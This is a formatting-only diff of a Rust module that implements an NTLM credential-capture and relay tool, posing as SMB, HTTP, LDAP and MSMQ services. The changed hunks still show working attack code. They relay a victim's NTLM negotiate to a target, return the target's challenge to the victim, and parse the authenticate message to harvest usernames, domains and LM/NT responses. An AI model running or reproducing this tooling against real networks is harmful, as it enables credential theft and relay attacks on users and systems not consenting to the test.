@@ -1,4 +1,4 @@
-﻿//! Responder Module
+//! Responder Module
 //!
 //! Implements credential capture via fake services
 //! (SMB, HTTP, LDAP, MSMQ) by listening for NTLM
@@ -368,11 +368,7 @@ impl Responder {
     /// When set, the HTTP responder will forward NTLM Negotiate/Authenticate
     /// through the relay instead of capturing credentials locally.
     /// The `handle` must be a handle to the tokio runtime where the relay runs.
-    pub fn set_relay(
-        &mut self,
-        relay: Arc<TokioMutex<crate::relay::NtlmRelay>>,
-        handle: Handle,
-    ) {
+    pub fn set_relay(&mut self, relay: Arc<TokioMutex<crate::relay::NtlmRelay>>, handle: Handle) {
         self.relay = Some(RelayBridge { relay, handle });
     }
 
@@ -408,7 +404,12 @@ impl Responder {
 
             let handle = thread::spawn(move || {
                 if let Err(e) = Self::run_http_server(
-                    running, &listen_ip, &challenge, captured, relay, pending_relays,
+                    running,
+                    &listen_ip,
+                    &challenge,
+                    captured,
+                    relay,
+                    pending_relays,
                 ) {
                     error!("HTTP server error: {}", e);
                 }
@@ -614,7 +615,10 @@ impl Responder {
                                         warn!("Mutex poisoned in Responder — recovering data");
                                         e.into_inner()
                                     })
-                                    .insert(client_ip.clone(), (relay_id, target_challenge.clone()));
+                                    .insert(
+                                        client_ip.clone(),
+                                        (relay_id, target_challenge.clone()),
+                                    );
 
                                 // Send the target's challenge back to victim
                                 let b64_challenge = base64_encode(&target_challenge);
@@ -633,10 +637,7 @@ impl Responder {
                                 );
                             }
                             Err(e) => {
-                                warn!(
-                                    "Relay negotiate failed for {}: {}",
-                                    client_ip, e
-                                );
+                                warn!("Relay negotiate failed for {}: {}", client_ip, e);
                                 let response = "HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
                                 stream.write_all(response.as_bytes()).ok();
                             }
@@ -688,18 +689,14 @@ impl Responder {
                                         );
 
                                         // Also capture the credential for hash harvesting
-                                        if let Ok(Some(auth)) =
-                                            std::panic::catch_unwind(|| {
-                                                parse_ntlm_authenticate(&ntlm_data)
-                                            })
-                                        {
+                                        if let Ok(Some(auth)) = std::panic::catch_unwind(|| {
+                                            parse_ntlm_authenticate(&ntlm_data)
+                                        }) {
                                             let cred = CapturedCredential {
                                                 client_ip,
                                                 username: auth.username,
                                                 domain: auth.domain,
-                                                challenge: bytes_to_hex(
-                                                    &challenge_bytes[24..32],
-                                                ),
+                                                challenge: bytes_to_hex(&challenge_bytes[24..32]),
                                                 lm_response: bytes_to_hex(&auth.lm_response),
                                                 nt_response: bytes_to_hex(&auth.nt_response),
                                                 protocol: "HTTP->SMB".to_string(),
@@ -735,8 +732,7 @@ impl Responder {
                                     client_ip
                                 );
                                 // Fall back to capture mode challenge
-                                let challenge_msg =
-                                    build_ntlm_challenge(challenge, "DOMAIN");
+                                let challenge_msg = build_ntlm_challenge(challenge, "DOMAIN");
                                 let b64_challenge = base64_encode(&challenge_msg);
                                 let response = format!(
                                     "HTTP/1.1 401 Unauthorized\r\n\
@@ -1794,5 +1790,4 @@ mod tests {
             assert!(map.is_empty());
         }
     }
-
 }
